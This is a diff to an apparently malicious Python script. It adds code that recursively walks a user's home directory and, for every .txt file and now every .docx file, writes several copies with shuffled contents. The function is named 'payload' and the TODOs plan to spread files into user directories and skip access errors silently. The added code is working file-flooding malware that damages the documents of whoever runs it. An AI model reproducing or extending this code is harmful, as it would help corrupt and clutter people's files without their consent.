@@ -19,7 +19,8 @@ from os import listdir
 from os.path import expanduser, islink, isdir, isfile
 import mimetypes
 from random import randint
-
+from docx import Document
+import sys
 
 
 # --------------------------------------------------------------------------
@@ -41,7 +42,7 @@ def users_home_dir():
     """
     # return expanduser("~")
     # return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
-    return "/home/telekobold/TestVerzeichnis/Linux-Test-Kopie" # For testing purposes
+    return "/home/telekobold/TestVerzeichnis/SS19-Test-Kopie" # For testing purposes
 
 
 def is_file_type(file, filetype):
@@ -71,8 +72,6 @@ def is_file_type(file, filetype):
     return False
 
 
-# TODO: Ensure that the function does not simply terminate in the event 
-# of an access or write error (e.g. if access rights are missing).
 def traverse_dirs(curr_file):
     """
     Recursively traverses all directories and subdirectories
@@ -87,10 +86,10 @@ def traverse_dirs(curr_file):
         if is_file_type(curr_file, "txt"):
             # print("TEXT file {}".format(curr_file)) # test output
             process_text_file(curr_file)
-        """
         elif is_file_type(curr_file, "docx"):
             print("DOCX file {}".format(curr_file)) # test output
             process_docx_file(curr_file)
+        """
         elif is_file_type(curr_file, "odt"):
             print("ODT file {}".format(curr_file)) # test output
             process_odt_file(curr_file)
@@ -108,9 +107,9 @@ def traverse_dirs(curr_file):
             traverse_dirs("{}/{}".format(curr_file, file))
             
             
-def read_file_to_dict(filename):
+def read_text_file_to_dict(filename):
     """
-    Reads the passed file line by line.
+    Reads the passed text file line by line.
     
     :returns: a dictionary whose keys are the line numbers (integer values) 
               and the appropriate values being the content of this line (string values).
@@ -124,7 +123,7 @@ def read_file_to_dict(filename):
     for i, line in zip(range(len(lines)), lines):
         result[i] = line
         
-    # print("read_file_to_dict: result = {}".format(result)) # test output
+    # print("read_text_file_to_dict: result = {}".format(result)) # test output
     return result
 
 
@@ -171,9 +170,9 @@ def shuffle_dict_content(dictionary):
     return result
 
 
-def write_dict_to_file(dictionary, filename):
+def write_dict_to_text_file(dictionary, filename):
     """
-    Writes every value of `dictionary` to a new line of `file`.
+    Writes every value of `dictionary` to a new line of the text file with `filename`.
     
     :dictionary: the dictionary that should be written to a file.
     :filename: the name of the file that should be filled with dictionary's content.
@@ -186,6 +185,8 @@ def write_dict_to_file(dictionary, filename):
     
 # TODO: Instead of writing the new files to the same directory as the "host" file, 
 # write them to any existing directory in the standard user directory.
+# TODO: Add error handling if file opening doesn't work (e.g. because of missing
+# access rights). Instead, just continue to the next file.
 def process_text_file(input_filename):
     """
     Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains 
@@ -196,25 +197,61 @@ def process_text_file(input_filename):
                      multiple times with shuffled file name and content.
     """
     global FILES_TO_WRITE_PER_DIR
-    input_file_content = read_file_to_dict(input_filename)
+    input_file_content = read_text_file_to_dict(input_filename)
     
     for i in range(FILES_TO_WRITE_PER_DIR):
         # filename = shuffle_filename(input_filename)
         # TODO: Replace the if-else construct by shuffle_filename usage:
+        filename = None
         if input_filename.endswith(".txt"):
             filename = input_filename[0:len(input_filename)-4:1] + str(i) + ".txt"
         else:
             filename = input_filename + str(i)
         file_content = shuffle_dict_content(input_file_content)
-        write_dict_to_file(file_content, filename)
+        write_dict_to_text_file(file_content, filename)
+    
+    
+def write_dict_to_docx_file(dictionary, filename):
+    """
+    Writes every value of `dictionary` to a new line of the docx file with `filename`.
+    
+    :dictionary: the dictionary that should be written to a file.
+    :filename: the name of the docx file that should be filled with dictionary's content.
+    """
+    document = Document()
+    paragraph = document.add_paragraph()
+    for i in range(len(dictionary)):
+        paragraph.add_run("{}\n".format(dictionary[i]))
+    document.save(filename)
 
 
-def process_docx_file(file):
+# TODO: Add error handling if file opening doesn't work (e.g. because of missing
+# access rights). Instead, just continue to the next file.
+def process_docx_file(input_filename):
     """
     Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
     the content of this text file, but with randomly shuffled content.
     """
-    pass
+    global FILES_TO_WRITE_PER_DIR
+    input_file_content = {}
+    document = Document(input_filename)
+    # Read out the document's text:
+    # TODO: Preserve the text's formatting
+    for i, p in zip(range(sys.maxsize), document.paragraphs):
+        input_file_content[i] = p.text
+    # TODO: Read out the document's tables
+    # TODO: Read out the document's pictures
+    
+    for i in range(FILES_TO_WRITE_PER_DIR):
+        # filename = shuffle_filename(input_filename)
+        # TODO: Use n_rand_numbers(n) for shuffling the file content
+        filename = None
+        if input_filename.endswith(".docx"):
+            filename = input_filename[0:len(input_filename)-5:1] + str(i) + ".docx"
+        else:
+            filename = input_filename + str(i)
+        file_content = shuffle_dict_content(input_file_content)
+        write_dict_to_docx_file(file_content, filename)
 
 
 def process_odt_file(file):
@@ -273,6 +310,7 @@ where each file has a randomly generated filename based on the filename of the r
 and containing the content of the read file, but with the words randomly shuffled.
 """
 def payload():
+    # TODO: The program does nothing if the passed directory doesn't exist.
     print("Started traversing dirs...") # test output
     traverse_dirs(users_home_dir())
     print("Finished traversing dirs!") # test output
